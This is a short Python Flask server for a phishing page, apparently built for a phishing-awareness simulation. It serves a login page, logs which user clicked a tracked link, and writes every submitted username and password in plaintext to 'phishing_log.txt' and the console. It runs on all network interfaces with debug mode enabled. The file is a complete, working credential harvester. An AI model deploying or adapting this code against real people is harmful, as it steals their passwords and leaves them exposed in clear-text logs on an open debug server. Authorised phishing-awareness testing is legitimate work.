from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

# Load the login page HTML once at start
with open("login.html", "r", encoding="utf-8") as f:
    login_page = f.read()

def log_to_file(message):
    with open("phishing_log.txt", "a", encoding="utf-8") as f:
        f.write(f"{datetime.now()} - {message}\n")

@app.route("/login")
def login():
    user = request.args.get("user", "unknown")
    log_message = f"User clicked link: {user}"
    print(log_message)
    log_to_file(log_message)
    return login_page

@app.route("/submit", methods=["POST"])
def submit():
    username = request.form.get("username")
    password = request.form.get("password")
    log_message = f"Credentials submitted: Username={username}, Password={password}"
    print(log_message)
    log_to_file(log_message)
    return "Success"  # the frontend will show the simulation message

#if __name__ == "__main__":
 #   app.run(debug=True)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
